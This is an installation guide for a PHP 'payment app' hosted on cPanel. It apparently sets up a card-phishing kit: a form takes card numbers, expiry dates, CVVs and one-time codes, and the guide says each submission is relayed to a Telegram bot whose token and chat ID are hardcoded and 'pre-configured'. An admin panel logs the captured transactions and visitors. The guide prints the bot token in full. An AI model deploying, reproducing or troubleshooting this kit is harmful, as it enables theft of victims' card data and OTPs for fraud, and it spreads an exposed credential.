# Installation Guide - cPanel/WordPress Hosting

## Prerequisites
- cPanel access on your hosting account
- MySQL database support
- PHP 7.0 or higher
- FTP or File Manager access

## Step-by-Step Installation

### Step 1: Download & Prepare Files
1. Extract all files from the ZIP
2. You should have these files:
   - index.html
   - admin.php
   - api.php
   - config.php
   - script.js
   - style.css
   - database.sql
   - README.md
   - INSTALLATION_GUIDE.md

### Step 2: Upload to cPanel

**Via File Manager (Easiest):**
1. Login to cPanel
2. Go to **File Manager**
3. Navigate to **public_html** folder
4. Click **Upload** button
5. Select all files and upload
6. Ensure they're in public_html root (not in a subfolder)

**Via FTP:**
1. Use FTP client (FileZilla, WinSCP, etc)
2. Connect using FTP credentials from cPanel
3. Navigate to public_html
4. Upload all files

### Step 3: Create MySQL Database

1. **In cPanel, find "MySQL Databases"**
2. **Create New Database:**
   - Name: `payment_app`
   - Click "Create Database"

3. **Create MySQL User:**
   - Username: `payment_user` (or your preferred name)
   - Password: Use a strong password
   - Click "Create User"

4. **Add Privileges:**
   - Select the user and database
   - Click "Add User to Database"
   - Check "All Privileges"
   - Click "Make Changes"

### Step 4: Initialize Database Tables

1. **Open phpMyAdmin in cPanel**
2. **Select the `payment_app` database** from left sidebar
3. **Go to the SQL tab** (top menu)
4. **Copy & paste** contents of `database.sql` file
5. **Click Execute button**

You should see messages: "Database `payment_app` already exists" and "2 table(s) created"

### Step 5: Edit Configuration File

1. **In File Manager or FTP, open `config.php`**
2. **Edit these lines** (around line 2-5):

```php
define('DB_HOST', 'localhost');
define('DB_USER', 'payment_user');           // CHANGE THIS
define('DB_PASSWORD', 'your_password_here'); // CHANGE THIS  
define('DB_NAME', 'payment_app');
```

Fill in:
- **DB_USER:** The MySQL username you created (e.g., `payment_user`)
- **DB_PASSWORD:** The password you created

Leave DB_HOST and DB_NAME as-is.

3. **Change admin password** (line 9):
```php
define('ADMIN_PASSWORD', 'YOUR_SECURE_PASSWORD'); // CHANGE THIS
```

Make it something strong!

4. **Save the file** (Telegram settings are pre-configured)

### Step 6: Set File Permissions

In File Manager:
1. Right-click on `config.php`
2. Click "Change Permissions"
3. Set to `600` (owner read/write only)
4. Click "Change Permissions"

This protects your database credentials.

### Step 7: Test the Installation

**Test Main App:**
1. Open browser: `https://yourdomain.com`
2. You should see the payment form
3. Try entering a test card:
   - Number: `4532111111111111`
   - Expiry: `12/25`
   - CVV: `123`
   - Name: `John Doe`
   - Email: `test@example.com`
4. Click "Verify Payment"
5. A 6-digit code should appear (check Telegram for message)
6. Enter the code to verify

**Test Admin Panel:**
1. Open: `https://yourdomain.com/admin.php`
2. Enter your admin password (set in step 5)
3. You should see:
   - Statistics dashboard
   - List of transactions you just created
   - Visitor activity logs

### Step 8: Enable HTTPS (Important!)

1. **In cPanel, find "SSL/TLS Manager"**
2. **Look for "AutoSSL"** - it usually auto-installs a free cert
3. If not auto-installed, use **Let's Encrypt** (free):
   - Click "Manage AutoSSL"
   - Check your domain
   - Click "Issue SSL Certificate"
4. **Wait a few minutes**
5. **Access your site as HTTPS:**
   - `https://yourdomain.com` (not http://)

## Verification Checklist

✅ All files uploaded to public_html
✅ Database created: `payment_app`
✅ Database user created with privileges
✅ Database tables imported from database.sql
✅ config.php edited with correct credentials
✅ config.php permissions set to 600
✅ Main site loads: `https://yourdomain.com`
✅ Admin panel accessible: `https://yourdomain.com/admin.php`
✅ Payment form submission works
✅ OTP verification works
✅ Telegram notifications received
✅ Admin dashboard shows transactions

## Troubleshooting

### "Error: Database connection failed"
- **Check:** config.php has correct DB_USER and DB_PASSWORD
- **Check:** Database `payment_app` exists in cPanel
- **Check:** MySQL user has privileges on the database
- **Fix:** Verify credentials in cPanel MySQL section

### "Error: No such file or directory"
- **Check:** All files are uploaded to public_html (not in subdirectory)
- **Check:** File names are exact (case sensitive on Linux)
- **Fix:** Re-upload files to correct location

### Admin panel shows "Invalid password"
- **Check:** You entered the correct password (case sensitive)
- **Check:** Verify password in config.php
- **Fix:** Edit config.php and set new admin password

### Transactions not appearing
- **Check:** Database tables were created (see phpMyAdmin)
- **Check:** No SQL errors when importing database.sql
- **Fix:** Delete tables and re-import database.sql

### Telegram notifications not working
- **Check:** Bot token: `8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g`
- **Check:** Chat ID: `-4843141531`
- **Note:** Some webhosts block outbound connections (rare, contact support)

### "Connection refused" error
- **Check:** MySQL is running (not suspended account)
- **Check:** Database server hostname is "localhost" (never an IP)
- **Fix:** Contact your hosting provider to enable MySQL

## After Installation

1. **Set up automatic backups:**
   - cPanel → Backup → Full backup (schedule weekly)

2. **Monitor the admin panel:**
   - Check transactions regularly
   - Review visitor logs for suspicious activity

3. **Update password periodically:**
   - Change admin password every 3 months

4. **Keep software updated:**
   - Ask hosting provider about PHP updates (7.4+ is good)

## Getting Help

**Hosting Issues:**
- Contact your hosting provider support
- Check cPanel help documentation

**Application Issues:**
- Check `error.log` file (if visible in File Manager)
- Review README.md for API documentation
- Test with simple form submission first

**Telegram Integration Issues:**
- Verify bot token and chat ID in config.php
- Check server firewall allows outbound HTTPS (port 443)
- Contact hosting provider if external requests are blocked

## Security Reminders

⚠️ **IMPORTANT:**
1. Always use HTTPS (not HTTP)
2. Change default admin password immediately
3. Never share config.php with anyone
4. Keep admin URL secret (consider renaming admin.php)
5. Regular database backups
6. Monitor access logs for suspicious activity

## What's Next?

After successful installation:
1. Test with real or test card numbers
2. Verify admin dashboard works
3. Set up email notifications (optional, see README.md)
4. Configure additional Telegram alerts if needed
5. Set up automated backups
6. Monitor and maintain regularly

---

**Need help?** Check error.log file or contact your hosting provider's support team.
